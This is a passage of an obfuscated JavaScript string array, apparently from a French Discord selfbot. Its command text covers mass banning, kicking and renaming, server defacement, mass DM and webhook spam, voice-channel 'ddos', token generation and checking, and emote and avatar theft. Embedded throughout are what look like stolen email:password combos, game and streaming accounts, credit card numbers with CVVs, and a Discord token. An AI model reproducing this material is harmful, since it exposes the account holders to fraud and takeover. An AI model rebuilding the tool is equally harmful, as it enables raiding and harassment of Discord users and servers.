0]\x20|\x20Abonné\x20=\x20False','Jan','`Envoie\x20une\x20image\x20sexe\x20en\x204k`','discord.gg','\x20sur\x20Tinder**','5491845077325101|10|2024|822','sydney','fetchWebhooks','Guild\x20ID:','metal','╟\x20Commande\x20google\x20executé','gen\x20token**','steal\x20emote','smile','https://discord.gift/zef5CSyFEv7GU4vmmXywERNF','\x20sur\x20Instagram**',':white_check_mark:\x20**En\x20Ligne**\x20:\x20','needforspeed425@yahoo.com:Volcom69','ernabuitenhuis@planet.nl:\x20bella1','emojis','prefix','facebook\x20(text)**','pas\x20de\x20team\x27','\x20\x0a║-->\x20User:\x20','vincent59530@gmail.com:motdepasse75\x20|\x20Expiration\x20=\x202019-09-03\x2007:04:43','╟\x20Commande\x20branlette\x20executé','setParty','defaultChanne','`Change\x20votre\x20token`','setEndTimestamp','`Spam\x20un\x20text`','KICK_MEMBERS','\x20highfive\x20avec\x20','```[','members','post','cry','==:fist:D:sweat_drops:\x20','Roblox','change\x20hypesquad\x20bravery','channels','ORANGE','RichEmbed','`auto\x20voice\x20kick`,\x20`stop\x20auto\x20voice\x20kick`,\x20`start\x20typing`,\x20`branlette`,\x20`lovecalc`,\x20`fight`,\x20`boom`,\x20`reverse`,\x20`nitro`,\x20`avatar`,\x20`8ball`,\x20`say`,\x20`smile`,\x20`kiss`,\x20`blush`,\x20`load`,\x20`punch`,\x20`hug`,`pat`,`salut`,`cv`','`Affiche\x20les\x20commandes\x20hack`\x20:skull_and_crossbones:','https://media.tenor.com/images/6083ba11631dd577bcc271268d010832/tenor.gif','skype\x20(text)**','smittymitty19@gmail.com:Smitty37','90%','**Commande\x20ddos\x20stopé**','coladx@gmail.com:Orange1234\x20|\x20Expiration\x20=\x202022-04-17\x2001:40:13','951448FtvtwF','charAt','╟\x20Commande\x20avatar\x20executé','setType',':spy:\x20**__Membre(s)\x20Total__**\x20:\x20','╚═════════════════════════════════╝','fagner.santos@ibest.com.br:\x20evikn45p','╟\x20Commande\x20cmd\x20executé','\x20sur\x20Roblox**','soem28@gmail.com:Mthomas77','ban-all**','15%','╟\x20Commande\x20clash\x20royal','application/json','Fev','swcw1211@aol.com:sw365533','pollardc33@gmail.com:heartgram7','https://discord.gift/r43shVb9t4D7CfU53grgKMMr','kitader@gmail.com:Tomorrow6\x20|\x20Expiration\x20=\x202022-05-22\x2002:32:47','╟\x20Commande\x20grab\x20pp\x20executé',':x:\x20**Vous\x20ne\x20pouvez\x20pas\x20supprimer\x20les\x20emotes\x20par\x20defaut**!','steveschulenberg@yahoo.com:illinois\x20\x20Units\x20=\x20270\x20Level\x20=\x2023\x20\x20Tier\x20=\x20Silver\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[far-cry-3,\x20far-cry-3-blood-dragon,\x20far-cry-4,\x20far-cry-5,\x20far-cry-new-dawn,\x20far-cry-primal]\x20Platforms\x20=\x20[PC,\x20PC,\x20PC,\x20PC,\x20PC','branlette**','╟\x20Commande\x20hentai\x20executé','Skype','set\x20serveur\x20name','probablement','nike','purge**',':white_check_mark:\x20**Auto\x20Voice\x20kick\x20setup\x20l\x27utilisateur\x20ne\x20pourra\x20plus\x20rejoindre\x20de\x20channel\x20vocal\x20de\x20ce\x20serveur**','STREAMING','load','109129WQgxry','Instagram','\x20sourit\x20:**','5491841103480846|09|2025|935','681978WJHJJZ','loading..```','Nov','`Envoie\x20les\x20information\x20du\x20serveur`','voice\x20kick\x20(@user)**','`Ban\x20tout\x20les\x20membres\x20d\x27un\x20serveur`','5491840440011264|10|2022|844','kdoggditty@yahoo.com:ZillaMonster1','roy-raphael2002@hotmail.com:Raph4461','`Met\x20un\x20statut\x20Nike`','╟\x20Commande\x20spotify\x20executé','name\x20all**','https://discord.gift/ATzSnmGTUcfFRag9Q49wqUpQ','`Permet\x20de\x20stopé\x20la\x20commande\x20mp\x20all`','╟\x20Commande\x20help\x20raid\x20executé','`Anime\x20un\x20message\x20saluant\x20tout\x20le\x20monde`','snapchat\x20(text)**','5491848158801214|11|2026|826','okpocharles84@gmail.com:emma8394\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20TR\x20|\x20','╟\x20Commande\x20instagram\x20executé','phone','nordvpn','log','gzip,\x20deflate,\x20br','`Met\x20un\x20statut\x20Gucci`','https://discord.gift/tdXxCG5XQAv9yBVPf5etqgp3','`Créer\x203\x20webhooks\x20par\x20salon\x20et\x20spam\x20avec\x20(ultra\x20rapide)`','\x0acouleur\x20du\x20role:\x20','smith.brayden00@gmail.com:Smithdawgs00','`Affiche\x20un\x20text\x20en\x20embed`','\x20est\x20un\x20robot\x20je\x20ne\x20peux\x20pas\x20charger\x20le\x20profile\x20desolé\x20:/','`Lance\x20une\x20attaque\x20ddos\x20sur\x20les\x20channels\x20vocal`','Incorrect\x20login\x20details\x20were\x20provided','unban','None','deniscernov@gmail.com:Parkurist070908','`Ajoute\x20tout\x20les\x20emojis\x20d\x27un\x20serveur\x20a\x20ton\x20serveur`','louie_07_louie@yahoo.com:amaterasu321','`Envoie\x20une\x20photo\x20de\x20fesse`','naruto','\x0a║-->At:\x20','startTyping','PATCH','(Commande\x20:\x20{/gtoken}\x20Effectuer)\x20\x0a\x20================','josiahmiller08@gmail.com:Tucker22','`Affiche\x20les\x20commandes\x20fun`\x20:joy:','nchampion46@gmail.com:Skyline46','https://media1.tenor.com/images/f7fde4b118501c8fa5cb1a5dd171beab/tenor.gif?itemid=5652242','user\x20info','game','`Met\x20un\x20statut\x20Minecraft`','stop\x20auto\x20voice\x20kick','https://discord.gg/5S54Svq6hR','8:fist:===D\x20','╟\x20Commande\x20ass\x20executé',':white_check_mark:\x20**Nuked\x20dms**','`Déface\x20entierement\x20un\x20serveur\x20(nom/icon/channels)`','`Met\x20un\x20statut\x20Clash\x20of\x20Clan`','acehardware182@yahoo.com:Redskins357\x20|\x20Expiration\x20=\x202021-04-27\x2006:49:40','end','dotexex77@gmail.com:legendry123','panicmax469@gmail.com:animation1','║-->\x20message\x20mp\x20modifié\x20\x0a║-->\x20User:\x20','getUTCDate','avatarURL','5491840506712847|12|2026|972','nsfw_allowed','start\x20typing**','╟\x20Commande\x20Lacoste\x20executé','zebi','setAvatar','non','**Stats\x20Membre**','infoplus','setName','neoredwolf11@gmail.com:yoi72Xyoi','ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789','`Affiche\x20l\x27avatar\x20d\x27un\x20membre`','removeFriend','push','Xiq-WQ','Juin','╟\x20Commande\x20create\x20channel\x20executé','createWebhook','start\x20typing','\x20sur\x20Skype**','5491844450124645|05|2026|277','75%','kick','xllelHltGdY7DP_0s1XST4cgzTs','setThumbnail','5491846255338841|08|2023|580','\x0a[https://discord.gift/sE7gEpcDQDUZKexV](https://discord.gg/rosa)','`Montre\x20des\x20informations\x20en\x20plus\x20sur\x20le\x20serveur`','8===:fist:D\x20','gen\x20token','╟\x20Commande\x20tokyo\x20ghoul\x20executé','╟\x20Commande\x20token\x20info\x20executé','user','***gen\x20un\x20carte\x20de\x20crédit\x20discord\x20(ne\x20pas\x20payer\x20de\x20nitro\x20sur\x20son\x20compte\x20risque\x20de\x20ban)***','***gen\x20un\x20neflix\x20uncheck***',':x:\x20**Access\x20Denied**','query','youtube\x20(text)**','shift','\x20sur\x20google**','afk\x20(text)**','╟\x20Commande\x20youtube\x20executé','discriminator','Medium','╟\x20Commande\x20restart\x20executé','95%','Apex\x20Legends','tokyo\x20ghoul\x20(text)**','8=:fist:==D\x20','createdAt','8==:fist:=D:sweat_drops:\x20','╟\x20Commande\x20Naruto\x20executé','displayAvatarURL','https://discordapp.com/api/v6/users/@me','╟\x20Commande\x20csgo','Texte\x20->\x20Base64\x20:','pornhub\x20(text)**','\x20sur\x20Minecraft**','ERROR','655091815401127966','csgo\x20(text)**','jean.van.de.weerdt@telenet.be:\x20weerdt86','5491848308252482|11|2024|767','channel','getUTCMonth','\x20vient\x20de\x20vous\x20ping\x20lors\x20de\x20votre\x20afk\x20','╟\x20Commande\x20check\x20token\x20executé','voice','setColor','kickable','getTime','`Envoie\x20une\x20image/gif\x20hentai`','parse','maj.glitch@gmail.com:invasion1\x20Units\x20=\x200\x20Level\x20=\x2016\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-brotherhood,\x20assassins-creed-4-black-flag,\x20far-cry-3,\x20,\x20watch-dogs]','Client','`Kick\x20tout\x20les\x20membres\x20d\x27un\x20serveur`','voiceChannel','POST','salut**',':x:\x20**permission\x20insuffisante\x20(embed_links)**\x0a<@&','Created',':white_check_mark:\x20**J\x27ai\x20correctement\x20volé\x20la\x20photo\x20de\x20profile\x20de\x20**\x20\x22','>>>\x20Restock\x20de\x20Metal\x20en\x20cours..','un\x20argument\x20est\x20nécessaire','mmicchaaell:qweasdzx123321\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Sram\x20-\x20Niv.\x2024\x20-\x20Meriana]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x2098,\x20Meriana\x20=\x208\x20159,\x20Nidas\x20=\x2011\x20410]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200,\x200]\x20|\x20Abonné\x20=\x20False','\x20\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Team\x20\x20\x20\x20:\x20','ban','rocket\x20league\x20(text)**','thigh','https://discord.gift/NBhZwGtppWaG9mvtt4ekKMZZ','\x0aCompte\x20vérifié?:\x20','\x20\x0an\x27est\x20pas\x20valide\x20:x:','setVoiceChannel','https://discord.gift/jXyzsSTtwdpWjnAmSAaNQrYc','belias6070@gmail.com:Br3874el','cookloco:banana123\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','840929985564114955','help\x20raid**','▓▓▓▓░░░░░░\x2040%',',\x20il\x20est\x20possible\x20que\x20je\x20n\x27ai\x20pas\x20les\x20permissions\x20:/','kikinavarro01@hotmail.com:Kiki2001','35%','**Liste\x20des\x20commandes**','2205826aIQpbs','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░\x2079%','writeFile',':x:\x20**Commande\x20uniquement\x20utilisable\x20sur\x20serveur**.','https://media1.tenor.com/images/b88fa314f0f172832a5f41fce111f359/tenor.gif?itemid=13356071','U.S.\x20East','deface**','encode\x20(text)**','jeremyresults@gmail.com:qw12QW!@','Commande\x20token\x20effectué','[Click\x20here!](','NjQ2MDk0MDkwOTQ0OTA1MjM4.XdMIZw.P8yTqKWm-0CNYbp4C8F_PraaYFs','Rocket\x20League','avatar\x20(@user)**','stringify','pgif','>>>\x20***Voila\x20ta\x20cc\x20:\x20***',':white_check_mark:\x20**J\x27ai\x20volé\x20les\x20emotes\x20du\x20serveur**\x20\x22','>>>\x20***Voila\x20ton\x20compte\x20dofus\x20:\x20***','Hors\x20Ligne/Invisible','pas\x20de\x20raison','roles\x20list**','offline',':x:\x20**Vous\x20n\x27avez\x20pas\x20les\x20permissions\x20pour\x20executer\x20cette\x20commande**','\x20```Nordvpn```\x20','\x20```Metal```\x20','5491842861246734|01|2025|590',':wave:\x20','cv**','kiss\x20(@user)**','\x0a╟─────────────────────────────────╢\x0a║-->\x20\x20Tu\x20Stream:\x20','WATCHING','anal','lovecalc\x20(@user)**','bannerURL','(Commande\x20:\x20{/nordvpn}\x20Effectuer)\x20\x0a\x20================','gif','paola.migliorin@alice.it:\x20paolam63','5491840405472758|09|2024|227','london','help\x20statut','\x0aLangue:\x20','cubigon@gmail.com:thunderbolt4','samfkissinger@gmail.com:Volvo1994','5491841728135437|09|2022|471','kevin.kniss@Web.de:raiden12','savitanjerry07@hotmail.com:Lovecouple08\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20','size','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement...**\x20\x0a\x20▓▓▓░░░░░░░░░░░░░░░░░░░░░░\x2012%','`ass`,\x20`4k`,\x20`anal`,\x20`hentai`,\x20`nsfw-gif`,\x20`pussy`,\x20`thigh`','`Eteint\x20le\x20selfbot`','╟\x20Comande\x20Fortnite\x20executé','╟\x20Commande\x20hug\x20executé','▓▓░░░░░░░░\x2020%','Vous\x20etes\x20sur\x20un\x20compte\x20nitro','uncleparks:rsca1070\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x2041,\x20Ilyzaelle\x20=\x20432]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False','length','./Data/liste.json','add\x20emote\x20(emote)\x20<name>**','70%','statusCode','`Reset\x20le\x20status`','sam_berube_14@hotmail.com:Gohabsgo18','clashroyal','trod2323@live.com:Basketball28\x20Units\x20=\x2055\x20\x20Level\x20=\x2011\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[,\x20far-cry-5,\x20rainbow-six-siege,\x20uno]\x20Platforms\x20=\x20[ANDROID,\x20PC,\x20XONE,\x20PC]','lorajohnson@charter.net:\x20Mustang01','tokyo\x20ghoul','╟\x20Commande\x20kick\x20all\x20executé','getUTCFullYear','guildCreate','stevenbradley54@yahoo.com:player54\x20Units\x20=\x20270\x20Level\x20=\x2019\x20\x20Tier\x20=\x20Bronze\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-III,\x20assassins-creed-4-black-flag,\x20assassins-creed-origins,\x20just-dance-2014,\x20the-crew,\x20tom-clancy-the-division,\x20trackmania-turbo]\x20\x20','***Mpall\x20en\x20cours\x20avec\x20le\x20message\x20:***\x20','troyky29@hotmail.com:troy052980\x20\x20Units\x20=\x2020\x20\x20Level\x20=\x2033\x20\x20Tier\x20=\x20Gold\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[airmech-arena,\x20assassins-creed-III,\x20far-cry-4,\x20far-cry-5,\x20far-cry-primal,\x20for-honor,\x20ghost-recon-wildlands,\x20grow-home,\x20rainbow-six-siege,\x20rayman-legends,\x20splinter-cell-blacklist,\x20steep,\x20the-crew,\x20tom-clancy-the-division,\x20uno,\x20watch-dogs-2,\x20watch-dogs,\x20watch-dogs]\x20\x20Platforms\x20=\x20[PS4,\x20PS3,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS3,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS4,\x20PS3','somariojv:Jvr19960\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False',':white_check_mark:\x20**Vous\x20avez\x20rejoint\x20la\x20hypesquad\x20\x27brilliance\x27**','benysachdeva171@gmail.com:viraaj2012','╟\x20Commande\x20afk\x20executé','`help`,\x20`help\x20fun`,\x20`help\x20utile`,\x20`help\x20moderation`,\x20`help\x20nsfw`,\x20`help\x20hack`,\x20`help\x20raid`','║-->\x20Vous\x20avez\x20rejoint\x20le\x20serveur\x20','Firefox','relation\x20estimée\x20à\x20❤','rtoken','https://discord.gift/RTcWpYAB3YzFhdK5EPZBrcwZ','pornhub','╟\x20Commande\x20twitter\x20executé','setAssetsSmallImage','https://www.twitch.tv/hml_cp0','oui!','`Créé\x20pleins\x20de\x20rôles`','webhook\x20spam','infoplus**','Mardi','une\x20erreur\x20est\x20survenue\x20que\x20je\x20ne\x20peux\x20régler','cimmy7777@hotmail.com:txaidu43','**Commandes\x20Moderation**\x20:tools::\x20','`kick\x20un\x20membre\x20du\x20serveur`','\x20```Netflix```\x20','stop\x20spam','\x20|\x20','boom\x20(@user)**','andrrena4io@mail.ru:Lowotortokoo1','Amsterdam','Singapore','**redémarrage**\x20du\x20self\x20bot...','Youpi','comploadann:blanco987\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[Iop\x20-\x20Niv.\x2042\x20-\x20Brumen]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Agride\x20=\x20,\x20Brumen\x20=\x2010\x20291]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False','luke02920@hotmail.com:Walkman1\x20|\x20Expiration\x20=\x202021-12-13\x2014:42:13','https://cdn.discordapp.com/attachments/710299976550318080/711951558006407208/9k.png','permission\x20insuffisante','author','721465320740487179','▓▓▓▓▓▓▓▓▓▓\x20100%','roles\x20list','png','https://www.twitch.tv/codezero_two_',':x:\x20**Le\x20serveur\x20ne\x20contient\x20aucun\x20emote.**','setUrl','https://cdn.discordapp.com/attachments/861692601026478121/862004674131787782/zt.png','655696285286006784',':x:\x20**Pas\x20de\x20test\x20definit**','╟\x20Commande\x20cry\x20executé','christophercrosbybrodka@gmail.com:inc0rrect\x20|\x20Expiration\x20=\x202020-07-01\x2016:14:40','/!/\x20Attention','5491844468304627|04|2024|744','ellinas_4_lyf@hotmail.com:clk230','discord.js','shutdown**','repeat','\x20```pornhub```\x20','`Affiche\x20les\x20commandes\x20info`\x20:globe_with_meridians:','encode','\x20__**VS**__\x20','punch','blush','815345046526230538','`Affiche\x20les\x20commandes\x20backups`\x20:gear:','couleur:','Default\x20Channel:','`Met\x20un\x20statut\x20Roblox`','`Met\x20un\x20statut\x20Lacoste`','5491840682141100|06|2022|805','https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif','bdgolish@gmail.com:ramblers1','memoryUsage','silverwolfe42@gmail.com:nlsh39etrk','╟\x20Commande\x20anal\x20executé',':white_check_mark:\x20**Tu\x20écoutes\x20','smile**','idle','cepheuse77@yahoo.com:Cndark77','MTI4NzM0OjFpMmhuZToxMjMxMjM','`Ajoute\x20un\x20emoji\x20au\x20serveur`','edi','jahairaabreu@gmail.com:alvin0118','setStartTimestamp','premium','hunter\x20x\x20hunter','╟─────────────────────────────────','pjarasek@alumni.nd.edu:Shutout121','first','thigh**','darling','`Rename\x20tout\x20les\x20membres\x20d\x27un\x20serveur`','╟\x20Commande\x20role\x20liste\x20executé','5491845268754473|01|2023|678','addField','5491844537826055|11|2022|365','description','Windows','Discord\x20Version\x20:\x20**','hug','`Redemarre\x20le\x20selfbot`','BAN_MEMBERS','`Liste\x20des\x20commandes`','grab\x20pp','\x20sur\x20Facebook**','parseEmoji','```lien\x20hastebins```','ballinjoey2332@gmail.com:tehghozt15','kearney_17@hotmail.com:Lagrange_67','fdp','`Supprime\x20tout\x20les\x20emojis\x20du\x20serveur`','displayName','Emojis\x20animés:\x20[','\x0aA2f\x20activé?:\x20','fight\x20(@user)**','apex\x20(text)**','pat','name','rocket\x20league','setURL','stop\x20mp\x20all','createChannel','ass**','>>>\x20Restock\x20\x20en\x20cours\x20\x0a\x20**Chargement..**\x20\x0a\x20▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░\x2032%','setNickname','`Lance\x20un\x20virus`','65%','jake.armour@hotmail.com:Ja713750','\x0aEmail:\x20','https://miro.medium.com/max/2560/0*Atmf_-eFRoumfr9j.png','╟\x20Commande\x20thigh\x20executé','pingall','andrew.benjamin75@yahoo.com:tqu98577','╟\x20Commande\x20help\x20fun\x20executé','562045hJfQeV','\x20```CC```\x20','Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64;\x20rv:66.0)\x20Gecko/20100101\x20Firefox/66.0','`Met\x20un\x20statut\x20Instagram`','>>>\x20Restock\x20de\x20token\x20en\x20cours..','steal\x20emote\x20(serveur\x20id)**','kazuo.st@gmail.com:kazu8086\x20\x20Units\x20=\x200\x20Level\x20=\x203\x20Tier\x20=\x20Blue\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[tom-clancy-the-division-2]\x20Platforms\x20=\x20[PC]','boom','twitter\x20(text)**','fortnite','>>>\x20***Voila\x20ton\x20compte\x20uplay\x20:\x20***','\x0amembres\x20ayant\x20ce\x20role:\x20','`Supprime\x20un\x20emoji\x20du\x20serveur`','https://media1.tenor.com/images/5ea40ca0d6544dbf9c0074542810e149/tenor.gif?itemid=14841901','newlachlan@gmail.com:Soccer89\x20|\x20Expiration\x20=\x202019-09-05\x2010:45:52','**nitro\x20autoclaim**','Nike','floor',':x:\x20**Veuillez\x20executer\x20cette\x20commande\x20sur\x20un\x20serveur!**','google','https://discord.gift/RqksgMqmyDMdxE8sD6htrwAJ','region','Google','`Permet\x20de\x20changer\x20sa\x20maison\x20hypesquad`',':x:\x20**Commande\x20pas\x20executable\x20en\x20mp**','XnyXiA','gspotify','jamais!','tinder','`Envoie\x20une\x20image\x20de\x20chattes`','pussy','edivhjortalus@yahoo.com:Shadow52','remove\x20emote\x20(emote)**','instagram\x20(text)**','XluxwQ','`Permet\x20de\x20dm\x20toutes\x20les\x20personnes\x20d\x27un\x20serveur`','Innactif','https://media.tenor.com/images/80c6b49239654be3a7cb4c58fb3b73be/tenor.gif','`Met\x20un\x20statut\x20Snapchat`','3_6Xt2k4OieDKimnNYGWUq9vJRo','HircHg','`Stop\x20une\x20attaque\x20ddos\x20sur\x20les\x20channels\x20vocal`','animated','╟\x20Commande\x20auto\x20voice\x20kick\x20stopé','donovanauronforbes@yahoo.com:\x20Snuffles93','╟\x20Commande\x20Hunter\x20X\x20Hunter\x20executé','subzero2004@yandex.ru:PIER5768','`deface`,\x20`spam`,\x20`webhook\x20spam`,\x20`create\x20channel`,\x20`stop\x20spam`,\x20`name\x20all`,\x20`ban\x20all`,\x20`kick\x20all`,\x20`delete\x20all\x20channels`,\x20`delete\x20all\x20role`','Un\x20nouveau\x20nitro\x20à\x20sûrement\x20été\x20ajouté\x20à\x20tes\x20crédits.','cherrydub@gmail.com:R0adrunner\x20|\x20Expiration\x20=\x202020-04-25\x2011:15:20','lucasof@terra.com.br:\x20akos1848','setJoinSecret','dwd15@hotmail.com:Dawoud87','`Met\x20un\x20statut\x20Naruto`','blood4rose:Koetje4893\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','luguito_03@hotmail.com:Swaggy0394','╟\x20Commande\x20say\x20executé','`Arrete\x20le\x20spam`','setApplicationId','madrileencm@gmail.com:august11996\x20|\x20Subscription:\x20Spotify\x20Free\x20|\x20US\x20|\x20','content','5491848260748113|10|2022|761','╟\x20Commande\x20gen\x20nitro\x20executé','random','spam\x20(text)**','>>>\x20Restock\x20de\x20comptes\x20Uplay\x20en\x20cours..','zell358:Perceval358\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[Meriana\x20=\x202\x20510,\x20Nidas\x20=\x2041]\x20|\x20Kamas\x20en\x20attente\x20=\x20[0,\x200]\x20|\x20Abonné\x20=\x20False','5491842871285425|01|2022|496','stream','\x0aId:\x20','/!\x5c\x20Attention','Quelle\x20est\x20ta\x20question?\x20:rolling_eyes:\x20(essayeplutot:','nuke\x20dm**','tipxdrakexdrfts@yahoo.com:Peehead2','catch','╟\x20Commande\x20fight\x20executé','655695570769412096','fetchBans','delete\x20all\x20channel**','lmartin85:Soul1402\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','kick\x20(@user)**','mentionnable:','\x20pleure\x20😭**','\x0a║-->\x20At:\x20','franckycud@orange.fr:\x20kyfranthe2','Reen69:manjivegeta1\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','╟\x20Commande\x20stop\x20mp\x20all\x20executé','base64','samijuju@yahoo.com:2precious\x20|\x20Expiration\x20=\x202022-07-27\x2023:18:32','en-US','╟\x20Commande\x20user\x20info\x20executé','╟\x20Commande\x20help\x20executé','https://media1.tenor.com/images/d37a6d3be2c5f56685579d59e225d256/tenor.gif','glowingorb@gmx.de:TdSoLi42','MANAGE_CHANNELS','setTitle','║-->\x201\x20message\x20mp\x20surppimé\x20\x0a║-->\x20User:\x20','`Met\x20un\x20statut\x20Spofity`','╟\x20Commande\x20encode\x20executé',':x:\x20**Veuillez\x20choisir\x20une\x20emote.**','**Pannel\x20de\x20Help\x20Raid**','role\x20info','dofus','`Frappe\x20un\x20membre`','𝚃𝚎𝚊𝚖\x20𝚁𝚂𝚉','Opapay4:dragonne4\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','╟\x20Commande\x20ddos\x20voc\x20executé','`Met\x20un\x20statut\x20Facebook`','`Anime\x20un\x20message\x20demandant\x20si\x20vous\x20allez\x20bien`','tokyo','**Pannel\x20de\x20Help\x20nsfw**\x20:underage:\x20','utf8','branlette','Manuxhil2002:minecraft11\x20|\x20SHIELD\x20=\x20False\x20|\x20Nombre\x20de\x20Goultines\x20=\x200\x20|\x20Nombre\x20d\x27Ogrines\x20=\x200\x20|\x20Nombre\x20de\x20Kroz\x20=\x200\x20|\x20Personnage\x20=\x20[]\x20|\x20Nombre\x20de\x20Kamas\x20=\x20[]\x20|\x20Kamas\x20en\x20attente\x20=\x20[]\x20|\x20Abonné\x20=\x20False','joseco1805@gmail.com:jmts1805','from','check\x20token\x20(token)**',':no_entry:\x20\x20**Ne\x20Pas\x20Deranger**\x20:\x20','**Pannel\x20de\x20Help\x20Utile**\x20:globe_with_meridians:\x20','help\x20raid',':x:**Tu\x20n\x27a\x20pas\x20la\x20permission\x20de\x20kick\x20un\x20utilisatur**.','minecraft\x20(text)**','(Commande\x20:\x20{/dofus}\x20Effectuer)\x20\x0a\x20================','`Affiche\x20les\x20commandes\x20moderation`\x20:tools:','italic','filter','╟\x20Commande\x20set\x20serveur\x20name\x20executé','team\x20RSZ','sond','instagram','feedcoma@gmail.com:yayluca123','badlion\x20(text)**','25%','zombie4208@gmail.com:zombie01\x20\x20Units\x20=\x20110\x20Level\x20=\x2031\x20\x20Tier\x20=\x20Gold\x20Club\x20Member\x20=\x20False\x20Games\x20=\x20[assassins-creed-brotherhood,\x20assasins-creed-ii,\x20assassins-creed-III,\x20assassins-creed-III,\x20assassins-creed-revelations,\x20assassins-creed-unity,\x20far-cry-3,\x20far-cry-3-blood-dragon,\x20far-cry-5,\x20for-honor,\x20rainbow-six-siege,\x20splinter-cell-conviction,\x20steep,\x20the-crew]','mp\x20all','bot','\x20va\x20vite\x20reclamer\x20ta\x20récompense!','https://media1.tenor.com/images/6151c42c94df654b1c7de2fdebaa6bd1/tenor.gif?itemid=16456868','messageUpdate','https://media.giphy.com/media/rFfmUWVMOyKVG/giphy.gif','all\x20ban','philippkielwein@gmail.com:philipp313\x20|\x20Expiration\x20=\x202019-09-09\x2011:17:57','kelvinzhang206@gmail.com:20020610\x20|\x20Expiration\x20=\x202019-09-12\x2017:35:32','*/*','now',':x:','{\x22theme\x22:\x22light\x22}','5491847675273758|03|2025|114','\x0aposition:\x20','tiffany_lemuss@yahoo.com:Chuncha123','kneedragger1000@msn.com:Ekck1006','oui','clash\x20royal','╟\x20Commande\x20rocket\x20league\x20executé','Clash\x20Of\x20Clan','\x20\x0a║-->\x20channel:\x20','\x20\x20\x20\x20\x